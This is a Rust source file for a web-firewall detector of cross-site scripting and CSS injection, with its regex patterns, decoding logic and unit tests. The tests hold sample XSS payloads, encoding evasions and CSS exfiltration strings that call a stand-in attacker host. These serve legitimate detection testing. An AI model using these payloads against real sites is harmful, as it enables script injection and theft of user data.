use aegis_core::pipeline::RequestView;
use regex::Regex;
use std::sync::LazyLock;

use super::{Detector, Signal};

/// XSS detector.
pub struct XssDetector;

static XSS_PATTERNS: LazyLock<Vec<Regex>> = LazyLock::new(|| {
    [
        r"(?i)<script[\s>]",
        r"(?i)</script>",
        // S-G (2026-06-18 round-2): the `javascript:` URI scheme fires only
        // when followed by a JS-execution sink. The inert href placeholders
        // `javascript:void(0)` / `javascript:;` / `javascript:` are ubiquitous
        // in captured DOM / analytics payloads and drove the xss benign
        // blocks. Rust's regex has no lookahead, so `void` is excluded by
        // listing the real sinks rather than a generic `ident(`.
        r"(?i)javascript\s*:\s*(?:alert|eval|prompt|confirm|atob|unescape|fetch|import\s*\(|location|document\s*\.|window\s*\.|top\s*\.|self\s*\.|parent\s*\.|globalthis|this\s*\.|new\s+function|function\b|settimeout|setinterval|string\s*\.\s*fromcharcode|xmlhttprequest|=>|\[)",
        r"(?i)vbscript\s*:",
        // S4 (2026-06-18): event handlers fire only inside a tag
        // (`<tag … onX=`). Bare `?onload=` query params (Cloudflare
        // Turnstile / reCAPTCHA JS callbacks) are legit and must not
        // trip. The `<[a-z!/]` prefix requires a tag-open before the
        // handler; `[^>]*` keeps us inside that tag. Reflected XSS
        // (`"><svg/onload=`, `<img onerror=`) still matches.
        r"(?i)<[a-z!/][^>]*\bon(?:load|error|click|mouse|focus|blur|submit|change|key|drag|touch|animat|transitionend)\s*=",
        r"(?i)<iframe[\s>]",
        r"(?i)<object[\s>]",
        r"(?i)<embed[\s>]",
        r"(?i)<applet[\s>]",
        r"(?i)<form[\s>]",
        r"(?i)<svg[\s>].*?(?:onload|onerror)",
        r"(?i)<img\s+[^>]*(?:onerror|onload)\s*=",
        r"(?i)expression\s*\(",
        r#"(?i)url\s*\(\s*['"]?\s*javascript:"#,
        r"(?i)data\s*:\s*text/html",
        r"(?i)&#x?[0-9a-f]+;",
        r"(?i)alert\s*\(",
        r"(?i)prompt\s*\(",
        r"(?i)confirm\s*\(",
        r"(?i)document\.(?:cookie|write|location|domain)",
        r"(?i)window\.(?:location|open|eval)",
        r"(?i)eval\s*\(",
        r"(?i)setTimeout\s*\(",
        r"(?i)setInterval\s*\(",
        r#"(?i)Function\s*\("#,
        r"(?i)\.innerHTML\s*=",
        r"(?i)\.outerHTML\s*=",
        r"(?i)fromCharCode\s*\(",
        // S6 (2026-06-18): the `\u00XX` escape pattern was dropped — it
        // tripped on every JSON body carrying a non-ASCII char (accented
        // names, addresses), a large benign surface. A bare unicode escape
        // is not executable; real XSS that uses it also carries
        // `<script`/`alert(`/`.innerHTML=`, which the other patterns catch.
        r#"(?i)<meta\s+[^>]*http-equiv\s*=\s*['"]?refresh"#,
    ]
    .iter()
    .map(|p| Regex::new(p).unwrap())
    .collect()
});

/// CSS-injection signatures (2026-06-16, css_injection_detection_gap_report).
/// XSS regexes are markup/script-shaped and matched 0/300 CSS samples; CSS
/// exfil has its own structural fingerprint (`@import`, resource-property
/// `url(http…)`, attribute-selector callback, `<style>`) that's absent from
/// benign request params — the same low-FP, rule-engine-shaped class as
/// nosql / template injection. Emitted under the distinct `css_injection`
/// tag so attribution stays clear.
static CSS_PATTERNS: LazyLock<Vec<Regex>> = LazyLock::new(|| {
    [
        // C1 — `@import` pulling an EXTERNAL sheet (OOB / data exfil):
        // `@import url(http…)`, `@import "http…"`, `@import url( http…`.
        r#"(?i)@import\s+(?:url\s*\(\s*)?['"]?\s*https?:"#,
        // C3 — resource-loading property pointing at an external origin:
        // `content|src|cursor|background|behavior|-moz-binding : url(http…)`.
        // Requires `https?://` so relative (`url(/img.png)`) and `data:`
        // inline assets — normal inline CSS — never flag.
        r#"(?i)(?:content|src|cursor|background(?:-image)?|behavior|-moz-binding)\s*:\s*url\s*\(\s*['"]?\s*https?://"#,
        // C4 — attribute-selector exfil: `[attr^="x"]{ … url( … )}` leaks a
        // char per request through a background callback.
        r#"(?i)\[\s*[a-z_-]+\s*[\^$*~|]?=\s*['"][^'"]*['"]\s*\]\s*\{[^}]*\burl\s*\("#,
        // C5 — inline `<style>` injection / `</style>` breakout.
        r#"(?i)</?style\b"#,
    ]
    .iter()
    .map(|p| Regex::new(p).unwrap())
    .collect()
});

impl Detector for XssDetector {
    fn id(&self) -> &'static str {
        "xss"
    }

    fn inspect(&self, req: &RequestView<'_>) -> Vec<Signal> {
        let mut signals = Vec::new();

        // GAP-012 (Run-6) + AC-P1-d (2026-07-03) — the URI now runs the
        // central `normalize_for_detection` pipeline (raw → repeated
        // URL-decode → HTML-entity → unicode-escape → hex-blob), the
        // same superset sqli uses. This closes the double-URL-encoded
        // (`%253Cscript`) evasion the old single-pass `url_decode`
        // missed while still covering the named/numeric-entity bypass.
        let raw_uri = req.uri.to_string();
        let uri_before = signals.len();
        for variant in super::normalize_for_detection(&raw_uri) {
            check_xss(&variant, "uri", &mut signals);
            if signals.len() > uri_before {
                break;
            }
        }
        // CSS check keeps the single URL-decode form (behavior-preserving).
        check_css(&super::url_decode(&raw_uri), "uri", &mut signals);

        let body = std::str::from_utf8(req.body.peek(8192)).unwrap_or("");
        // S-B (2026-06-18 round-2) — skip bot-management sensor beacons
        // (form-urlencoded/text-plain single huge high-entropy value). The
        // blob coincidentally matches tag/handler/`javascript:` shapes and
        // drove the xss benign blocks. Mirrors the cmdi/sqli body gate.
        if !body.is_empty() && !super::form_body_is_opaque_beacon(req.headers, body) {
            // AC-P1-d — parity with sqli's body posture: structured-text
            // bodies the origin will parse (`body_is_scannable`: JSON /
            // form / XML / text) get the full multi-variant decode so
            // `{"x":"<script>"}` and double-URL-encoded forms
            // are caught. Untyped / opaque bodies keep the legacy narrow
            // scan — the heavier decode there is unjustified cost and an
            // FP surface, exactly why sqli gates the same way.
            let body_before = signals.len();
            if super::body_is_scannable(req.headers) {
                for variant in super::normalize_for_detection(body) {
                    check_xss(&variant, "body", &mut signals);
                    if signals.len() > body_before {
                        break;
                    }
                }
            } else {
                let url_decoded_body = super::url_decode(body);
                let entity_decoded_body = super::html_entity_decode(&url_decoded_body);
                check_xss(&url_decoded_body, "body", &mut signals);
                if entity_decoded_body != url_decoded_body {
                    check_xss(&entity_decoded_body, "body", &mut signals);
                }
            }
            check_css(&super::url_decode(body), "body", &mut signals);
        }

        // 2026-05-22 — `cookie` removed from the XSS scan set. Cookies
        // are server-set and not a reflected-XSS injection vector for the
        // same site; scanning the whole cookie blob caused frequent false
        // positives (analytics/consent cookies contain `&#NN;`, `\u00XX`,
        // `onX=` substrings that trip the patterns). referer + user-agent
        // stay — those ARE attacker-controlled and reflected.
        for name in &["referer", "user-agent"] {
            if let Some(val) = req.headers.get(*name).and_then(|v| v.to_str().ok()) {
                check_xss(val, name, &mut signals);
                let entity_decoded = super::html_entity_decode(val);
                if entity_decoded != val {
                    check_xss(&entity_decoded, name, &mut signals);
                }
            }
        }

        signals
    }
}

fn check_xss(input: &str, field: &str, signals: &mut Vec<Signal>) {
    for re in XSS_PATTERNS.iter() {
        if re.is_match(input) {
            signals.push(Signal {
                score: super::scores::xss::XSS,
                tag: "xss".into(),
                field: field.into(),
            });
            return;
        }
    }
}

/// CSS-injection check (one `css_injection` signal per field). Scans the
/// input as-is, and — when control bytes are present — a deobfuscated copy
/// with them stripped, so `htt\x00p://` and `@im\nport` (null-byte / newline
/// WAF-bypass variants) still match.
fn check_css(input: &str, field: &str, signals: &mut Vec<Signal>) {
    if css_matches(input) {
        push_css(signals, field);
        return;
    }
    if let Some(deobf) = css_deobfuscate(input) {
        if css_matches(&deobf) {
            push_css(signals, field);
        }
    }
}

fn css_matches(input: &str) -> bool {
    CSS_PATTERNS.iter().any(|re| re.is_match(input))
}

fn push_css(signals: &mut Vec<Signal>, field: &str) {
    signals.push(Signal {
        score: super::scores::xss::XSS,
        tag: "css_injection".into(),
        field: field.into(),
    });
}

/// Strip ASCII control bytes (`\x00`–`\x1f`, e.g. null / CR / LF / tab) used
/// to break up `@import` / `http` tokens. Returns `None` when there's
/// nothing to strip so the caller doesn't rescan an identical string. Space
/// (`0x20`) is preserved — the `url(`-form patterns tolerate inner spaces.
fn css_deobfuscate(input: &str) -> Option<String> {
    if !input.bytes().any(|b| b < 0x20) {
        return None;
    }
    Some(input.chars().filter(|c| (*c as u32) >= 0x20).collect())
}

#[cfg(test)]
mod tests {
    use super::*;
    use aegis_core::pipeline::BodyPeek;

    fn view_with_uri(uri: &str) -> (http::Method, http::Uri, http::HeaderMap, BodyPeek) {
        (
            http::Method::GET,
            uri.parse().unwrap(),
            http::HeaderMap::new(),
            BodyPeek::empty(),
        )
    }

    fn make_view<'a>(
        m: &'a http::Method,
        u: &'a http::Uri,
        h: &'a http::HeaderMap,
        b: &'a BodyPeek,
    ) -> RequestView<'a> {
        RequestView {
            method: m,
            uri: u,
            version: http::Version::HTTP_11,
            headers: h,
            peer: "127.0.0.1:1234".parse().unwrap(),
            tls: None,
            body: b,
        }
    }

    macro_rules! positive {
        ($name:ident, $input:expr) => {
            #[test]
            fn $name() {
                let d = XssDetector;
                let (m, u, h, b) = view_with_uri($input);
                let req = make_view(&m, &u, &h, &b);
                assert!(!d.inspect(&req).is_empty(), "expected XSS for: {}", $input);
            }
        };
    }

    macro_rules! negative {
        ($name:ident, $input:expr) => {
            #[test]
            fn $name() {
                let d = XssDetector;
                let (m, u, h, b) = view_with_uri($input);
                let req = make_view(&m, &u, &h, &b);
                assert!(d.inspect(&req).is_empty(), "false positive for: {}", $input);
            }
        };
    }

    positive!(xss_script_tag, "/?q=%3Cscript%3Ealert(1)%3C/script%3E");
    positive!(xss_script_src, "/?q=%3Cscript+src=evil.js%3E%3C/script%3E");
    positive!(xss_onerror, "/?q=%3Cimg+onerror=alert(1)+src=x%3E");
    // S-G (2026-06-18 round-2) — `javascript:` now requires a JS-execution
    // sink. `javascript:alert(1)` fires; the inert href placeholders
    // `javascript:void(0)` / `javascript:;` (ubiquitous in captured DOM /
    // analytics payloads) no longer do.
    positive!(xss_javascript_alert, "/?q=javascript:alert(1)");
    positive!(xss_javascript_eval,  "/?q=javascript:eval(atob('x'))");
    positive!(xss_javascript_docref, "/?u=javascript:document.cookie");
    negative!(xss_javascript_void_inert, "/?q=javascript:void(0)");
    negative!(xss_javascript_semicolon,  "/?q=javascript:;");
    negative!(xss_javascript_void_space, "/?q=javascript:void%200");
    positive!(xss_eval, "/?q=eval%28%27malicious%27%29");
    positive!(xss_document_cookie, "/?q=document.cookie");
    positive!(xss_window_location, "/?q=window.location");
    positive!(xss_iframe, "/?q=%3Ciframe+src=evil%3E");
    positive!(xss_object, "/?q=%3Cobject+data=x%3E");
    positive!(xss_embed, "/?q=%3Cembed+src=x%3E");
    positive!(xss_onload, "/?q=%3Cbody+onload=alert%281%29%3E");
    positive!(xss_onclick, "/?q=%3Ca+onclick=alert%281%29%3E");
    positive!(xss_set_timeout, "/?q=setTimeout%28function%28%29%7B%7D%2C0%29");
    positive!(xss_set_interval, "/?q=setInterval%28fn%2C100%29");
    positive!(xss_function_constructor, "/?q=Function%28%27alert%281%29%27%29%28%29");
    positive!(xss_innerhtml, "/?q=.innerHTML=payload");
    positive!(xss_from_char_code, "/?q=fromCharCode(65)");
    positive!(xss_prompt, "/?q=prompt('xss')");
    positive!(xss_confirm, "/?q=confirm('xss')");
    positive!(xss_alert, "/?q=alert(document.domain)");
    positive!(xss_svg_onload, "/?q=%3Csvg+onload=alert(1)%3E");
    positive!(xss_expression, "/?q=expression(alert(1))");
    positive!(xss_data_text, "/?q=data:text/html,%3Ch1%3Exss%3C/h1%3E");
    positive!(xss_document_write, "/?q=document.write('x')");
    positive!(xss_vbscript, "/?q=vbscript:msgbox");
    positive!(xss_meta_refresh, "/?q=%3Cmeta+http-equiv=%22refresh%22%3E");
    positive!(xss_applet, "/?q=%3Capplet+code=x%3E");
    positive!(xss_onmouseover, "/?q=%3Cdiv+onmouseover=alert(1)%3E");
    positive!(xss_html_entity, "/?q=%26%23x3c;script%26%23x3e;");

    // ---- S4 (2026-06-18) onX= requires HTML context ----
    //
    // §2b FP fix: bare `on<event>=` matched anywhere — Cloudflare
    // Turnstile (`api.js?onload=KHGO2`) and JS callback params are
    // legit. The handler now fires only inside a tag (`<tag … onX=`).

    // Tag-context handler that the svg/img-specific patterns MISS
    // (`<svg/onload` — `/` is neither `\s` nor `>`) and that carries
    // no `alert(` — so it exercises the onX pattern alone.
    positive!(s4_svg_slash_onload, "/?q=%22%3E%3Csvg/onload=foo()%3E");
    positive!(s4_input_onfocus_tag, "/?q=%3Cinput+onfocus=bar()+autofocus%3E");

    negative!(s4_turnstile_onload, "/api.js?onload=KHGO2");
    negative!(s4_onload_callback, "/t?onload=false&render=explicit");
    negative!(s4_onclick_param, "/widget?onclick=trackEvent");
    negative!(s4_onerror_param, "/img?onerror=fallback");
    negative!(s4_onload_recaptcha, "/recaptcha/api.js?onload=onloadCallback&render=explicit");

    negative!(clean_root, "/");
    negative!(clean_api, "/api/users?page=1");
    negative!(clean_search, "/search?q=hello+world");
    negative!(clean_path, "/products/123");
    negative!(clean_json, "/api?format=json");
    negative!(clean_static, "/static/app.js");
    negative!(clean_health, "/health");
    negative!(clean_download, "/files/doc.pdf");
    negative!(clean_blog, "/blog/my-post");
    negative!(clean_deep, "/a/b/c/d/e");
    negative!(clean_numeric, "/items/42");
    negative!(clean_encoded, "/path?name=John%20Doe");
    negative!(clean_bool, "/api?active=true");
    negative!(clean_locale, "/en-US/welcome");
    negative!(clean_version, "/v2/resource");
    negative!(clean_dash, "/my-resource");
    negative!(clean_underscore, "/my_page");
    negative!(clean_date, "/archive/2024");
    negative!(clean_empty_query, "/path?");
    negative!(clean_robots, "/robots.txt");
    negative!(clean_sitemap, "/sitemap.xml");
    negative!(clean_css, "/style.css");
    negative!(clean_image, "/logo.png");
    negative!(clean_hash, "/page#section");
    negative!(clean_uuid, "/api/550e8400-e29b-41d4-a716-446655440000");
    negative!(clean_sort, "/items?sort=name&order=asc");
    negative!(clean_webhook, "/webhooks/stripe");
    negative!(clean_feed, "/feed.xml");
    negative!(clean_manifest, "/manifest.json");
    negative!(clean_service_worker, "/sw.js");

    // GAP-012 (Run-6, 2026-05-09) — HTML-entity decode coverage.
    // Named-entity (&lt;…&gt;) and numeric-entity (&#60;…&#62;)
    // forms must fire after entity-decode normalisation. The
    // existing pattern set already catches numeric-entity LITERALS
    // (`&#60;` matches `&#x?[0-9a-f]+;`), so the regression
    // tests below pin both the literal-match and the post-decode
    // recheck for the named-entity bypass.

    // Named entity — no `#`, URI parses cleanly.
    positive!(xss_entity_named_lt_gt,
        "/?q=&lt;script&gt;alert(1)&lt;/script&gt;");
    // Numeric entities require URL-encoding the `#` as `%23` so
    // http::Uri doesn't treat it as a fragment delimiter — this
    // is also what real attackers send, since unencoded `#` in
    // a query string is reliably stripped by the URL parser.
    positive!(xss_entity_numeric_decimal,
        "/?q=&%2360;script&%2362;alert(1)&%2360;/script&%2362;");
    positive!(xss_entity_numeric_hex,
        "/?q=&%23x3c;script&%23x3e;alert(1)&%23x3c;/script&%23x3e;");
    positive!(xss_entity_javascript_uri,
        "/?next=javascript&colon;alert(1)");
    positive!(xss_entity_url_encoded_decimal,
        // %26%2360%3B = &#60; — url-decode then entity-decode.
        "/?q=%26%2360%3Bscript%26%2362%3Balert(1)%26%2360%3B/script%26%2362%3B");

    // Negatives — legit content with `&` separators or entity-like
    // chars must NOT FP.
    negative!(clean_amp_separator,
        "/api?a=1&b=2&c=3");
    negative!(clean_amp_in_text,
        "/contact?msg=Tom+%26+Jerry");
    negative!(clean_bare_amp,
        "/?q=Rock+%26+Roll");
    negative!(clean_named_entity_no_xss,
        // `&copy;` decodes to nothing in our narrow table; even if
        // it did, the result wouldn't match XSS patterns.
        "/?q=Copyright+&copy;+2026");

    // 2026-05-22 — the `cookie` header is no longer scanned for XSS
    // (server-set, not a reflected vector). A cookie value carrying
    // XSS-like substrings (e.g. an analytics blob with `&#x3c;`) must
    // NOT trip the detector — while the SAME content in referer /
    // user-agent (attacker-controlled, reflected) still must.
    fn header_view(name: &str, value: &str) -> Vec<Signal> {
        let m = http::Method::GET;
        let u: http::Uri = "/".parse().unwrap();
        let mut h = http::HeaderMap::new();
        h.insert(
            http::header::HeaderName::from_bytes(name.as_bytes()).unwrap(),
            value.parse().unwrap(),
        );
        let b = BodyPeek::empty();
        XssDetector.inspect(&make_view(&m, &u, &h, &b))
    }

    #[test]
    fn cookie_with_xss_like_content_is_ignored() {
        // analytics/consent cookie carrying a numeric entity + an onX= run
        let cookie = "_ga=GA1.2.123; consent=&#x3c;x&#x3e;; ab_test=onerror=1";
        assert!(
            header_view("cookie", cookie).is_empty(),
            "cookie must not be XSS-scanned",
        );
    }

    #[test]
    fn referer_and_user_agent_still_scanned() {
        assert!(
            !header_view("referer", "https://x.test/?q=<script>alert(1)</script>").is_empty(),
            "referer must still be XSS-scanned",
        );
        assert!(
            !header_view("user-agent", "Mozilla/5.0 <script>alert(1)</script>").is_empty(),
            "user-agent must still be XSS-scanned",
        );
    }

    // ===== CSS injection (2026-06-16, css_injection_detection_gap_report) =====
    // The complex CSS payloads carry `{ } [ ] " :` and spaces, so they're
    // tested through the request BODY (xss scans the body unconditionally),
    // plus one percent-encoded query case to prove the URL path.

    fn css_body(body: &str) -> Vec<Signal> {
        let m = http::Method::POST;
        let u: http::Uri = "/submit".parse().unwrap();
        let h = http::HeaderMap::new();
        let b = BodyPeek::new(body.as_bytes().to_vec(), Some(body.len() as u64), false);
        XssDetector.inspect(&make_view(&m, &u, &h, &b))
    }

    macro_rules! css_positive {
        ($name:ident, $body:expr) => {
            #[test]
            fn $name() {
                assert!(!css_body($body).is_empty(), "expected CSS injection for: {}", $body);
            }
        };
    }
    macro_rules! css_negative {
        ($name:ident, $body:expr) => {
            #[test]
            fn $name() {
                assert!(css_body($body).is_empty(), "false positive (CSS) for: {}", $body);
            }
        };
    }

    // C1 import_oob — `@import` pulling an external stylesheet (url() and string form).
    css_positive!(css_import_url, "@import url(http://attacker.evil.com/)");
    css_positive!(css_import_string, "@import \"https://attacker.evil.com/x.css\"");
    // C3 property exfil — content/src/cursor/background:url(http…).
    css_positive!(css_prop_content, "#content{content:url(http://attacker.evil.com/c.png)}");
    css_positive!(css_prop_src, "#app{src:url(http://attacker.evil.com/s.woff)}");
    css_positive!(css_prop_cursor, "body{cursor:url(http://attacker.evil.com/cur.png),auto}");
    // C4 attribute-selector exfil — leaks a char per request via callback.
    css_positive!(css_attr_selector, "input[class^=\"D\"]{background:url(http://attacker.evil.com/?p=D)}");
    // C5 style tag.
    css_positive!(css_style_tag, "</style><style>body{color:red}</style>");
    // C6 obfuscation — null byte inside `http`, newline inside `@import`,
    // space after `url(`.
    css_positive!(css_obf_null_byte, "*{background:url(htt\u{0}p://attacker.evil.com/)}");
    css_positive!(css_obf_newline_import, "@im\nport url(http://attacker.evil.com/)");
    css_positive!(css_obf_url_space, "@import url( http://attacker.evil.com/)");

    // Query path (percent-encoded) — proves the URI scan, not just body.
    positive!(css_import_in_query, "/g?css=@import%20url(http://attacker.evil.com/)");

    // S6 (2026-06-18) — JSON bodies routinely encode non-ASCII characters
    // as `\uXXXX` escapes (accented Latin names, addresses, free text). The
    // old `\\u00[0-9a-f]{2}` pattern tripped on every such body — e.g. a
    // profile update with display_name "María José" serializes to the wire as
    // `María José` → XSS BLOCK. A bare unicode escape is not itself
    // executable; real XSS that uses it always also carries
    // `<script`/`alert(`/`.innerHTML=`, which the other patterns catch. The
    // escape pattern is dropped. (Raw strings below keep the `\u` literal,
    // matching exactly what the JSON serializer puts on the wire.)
    css_negative!(
        json_accented_display_name,
        "{\"email\": \"user.name+tag@sub.example.co.uk\", \"display_name\": \"Mar\\u00eda Jos\\u00e9\"}"
    );
    css_negative!(
        json_accented_name_run,
        "{\"city\": \"M\\u00fcnchen\", \"note\": \"\\u00e9\\u00e8\\u00ea\"}"
    );

    #[test]
    fn css_injection_uses_distinct_tag() {
        let s = css_body("@import url(http://attacker.evil.com/)");
        assert!(
            s.iter().any(|sig| sig.tag == "css_injection"),
            "CSS injection must emit the css_injection tag, got: {s:?}",
        );
    }

    // Negatives — legit CSS / params must NOT FP.
    css_negative!(css_clean_plain, "body { color: red; margin: 0 auto; }");
    css_negative!(css_clean_hover, ".btn:hover { background: #fff; border-radius: 4px; }");
    // Local / relative url() and data: URIs are normal inline-asset CSS.
    css_negative!(css_clean_local_url, "div{background:url(/static/img/logo.png)}");
    css_negative!(css_clean_data_uri, "i{background:url(data:image/png;base64,iVBOR)}");
    // A redirect-style param carrying an external https URL is open_redirect's
    // job, not CSS — no `@import`/`url(`/selector structure here.
    negative!(css_clean_redirect_param, "/r?next=https://example.com/welcome");

    // ===== S-B (2026-06-18 round-2) — beacon gate on the body scan =====

    fn body_with_ct(ct: &str, body: &str) -> Vec<Signal> {
        let m = http::Method::POST;
        let u: http::Uri = "/submit".parse().unwrap();
        let mut h = http::HeaderMap::new();
        h.insert("content-type", ct.parse().unwrap());
        let b = BodyPeek::new(body.as_bytes().to_vec(), Some(body.len() as u64), false);
        XssDetector.inspect(&make_view(&m, &u, &h, &b))
    }

    fn xss_blob() -> String {
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_"
            .chars()
            .cycle()
            .take(320)
            .collect()
    }

    // ===== AC-P1-d (2026-07-03) — decode parity with sqli =====
    //
    // The XSS pipeline decoded url(single-pass)+entity only, so two
    // evasion classes slipped (red-team vector 07): unicode-escaped
    // JSON payloads (`<script>` — frameworks decode these
    // transparently before rendering) and double-URL-encoded forms
    // (`%253Cscript`). Structured-text bodies and the URI now run the
    // central `normalize_for_detection` pipeline (same as sqli).
    // S6 stays honored: these decode-then-match tests are the inverse
    // of the removed `\u00XX` literal PATTERN — a bare escape still
    // never fires (see the accented-name negatives below).

    // Payloads below deliberately use `<iframe>` (no bare `alert(` /
    // `document.` substring) so they can ONLY fire after the decode
    // pass — isolating the new capability from the raw-pattern set.
    // A JSON serializer emits `<` as the 6-byte escape backslash-u-003c.
    // Build it from a backslash char so the source carries no literal
    // escape sequence a tool might normalize away.
    fn uesc(cp: &str) -> String {
        let bs = '\\';
        format!("{bs}u{cp}")
    }

    #[test]
    fn json_body_unicode_escaped_iframe_fires() {
        // `<iframe src=x>` — the JS/JSON source form a
        // framework decodes before rendering. Raw it matches nothing
        // (no literal `<`); the unicode-decode pass reveals it.
        let body = format!(
            "{{\"x\":\"{}iframe src=x{}\"}}",
            uesc("003c"),
            uesc("003e"),
        );
        assert!(
            !body_with_ct("application/json", &body).is_empty(),
            "unicode-escaped <iframe> in JSON body must fire",
        );
    }

    #[test]
    fn form_body_double_url_encoded_iframe_fires() {
        // %253C → %3C → <  (two decode passes needed)
        let body = "q=%253Ciframe%2520src%253Dx%253E";
        assert!(
            !body_with_ct("application/x-www-form-urlencoded", body).is_empty(),
            "double-URL-encoded <iframe> in form body must fire",
        );
    }

    // Double-URL-encoded payload in the QUERY — the data-plane hands
    // the detector the raw wire form, so the surplus encode layer is
    // still present and only the repeated-decode pass unwraps it.
    positive!(xss_double_url_encoded_uri,
        "/?q=%253Ciframe%2520src%253Dx%253E");

    // S6 regression guards on the NEW pipeline: accented JSON content
    // decodes to plain text and must stay clean under a scannable
    // content-type (the original S6 corpus posts carried none).
    #[test]
    fn json_accented_name_with_ct_still_clean() {
        let body = r#"{"email":"a@b.co","display_name":"María José"}"#;
        assert!(
            body_with_ct("application/json", body).is_empty(),
            "accented display-name must stay clean after unicode decode",
        );
    }

    #[test]
    fn json_escaped_benign_richtext_still_clean() {
        // Serializer-escaped harmless markup (`<b>bold</b>`) — no
        // sink tag / handler / JS shape after decoding.
        let body = r#"{"html":"<b>bold</b>"}"#;
        assert!(
            body_with_ct("application/json", body).is_empty(),
            "escaped benign markup must stay clean",
        );
    }

    // Untyped bodies keep the legacy narrow pipeline: the heavier
    // multi-variant decode is gated on `body_is_scannable` (structured
    // text the origin will parse), mirroring the sqli posture. A
    // content-type-less body with a unicode-escaped payload therefore
    // stays un-decoded — injection there is an app-layer concern.
    #[test]
    fn untyped_body_unicode_escape_not_decoded() {
        // Same escaped payload as the JSON test, but `css_body` sends
        // NO content-type → not `body_is_scannable` → the heavy decode
        // pipeline is skipped, so the escaped form stays inert.
        let body = format!(
            "{{\"x\":\"{}iframe src=x{}\"}}",
            uesc("003c"),
            uesc("003e"),
        );
        assert!(
            css_body(&body).is_empty(),
            "untyped body must not get the heavy decode pipeline",
        );
    }

    #[test]
    fn text_plain_sensor_beacon_with_coincidental_xss_is_skipped() {
        // 2026-06-18 r2: a text/plain sensor beacon whose high-entropy blob
        // coincidentally contains a `<img … onerror=>` shape must be skipped
        // — bot telemetry, not a reflected-XSS surface.
        let body = format!("{{\"sensor_data\":\"{}<img src=x onerror=alert(1)>\"}}", xss_blob());
        assert!(
            body_with_ct("text/plain;charset=UTF-8", &body).is_empty(),
            "text/plain sensor beacon must be skipped by xss",
        );
    }

    #[test]
    fn real_xss_in_short_text_body_still_fires() {
        // Same shape in a short, low-entropy body → NOT a beacon → fires.
        assert!(
            !body_with_ct("text/plain", "<img src=x onerror=alert(1)>").is_empty(),
            "real xss in a normal text body must still fire",
        );
    }
}
